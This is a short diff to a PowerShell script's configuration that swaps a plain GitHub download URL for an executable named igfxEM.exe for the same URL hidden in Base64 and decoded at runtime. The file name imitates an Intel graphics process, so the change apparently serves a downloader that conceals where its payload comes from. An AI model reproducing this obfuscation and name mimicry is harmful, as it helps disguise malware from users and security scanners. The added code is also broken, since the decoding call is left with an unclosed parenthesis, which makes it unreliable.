@@ -1,5 +1,8 @@
 # === CONFIG (yahan apne values daalo) ===
-$ExeUrl  = "https://github.com/Gadgetechno/neww/releases/download/new/igfxEM.exe"
+$EncodedUrl = "aHR0cHM6Ly9naXRodWIuY29tL0dhZGdldGVjaG5vL25ld3cvcmVsZWFzZXMvZG93bmxvYWQvbmV3L2lnZnhFTS5leGU="
+$ExeUrl = [Text.Encoding]::UTF8.GetString(
+    [Convert]::FromBase64String($EncodedUrl)
+
 $AppName = "igfxEM.exe"
 # ========================================
 
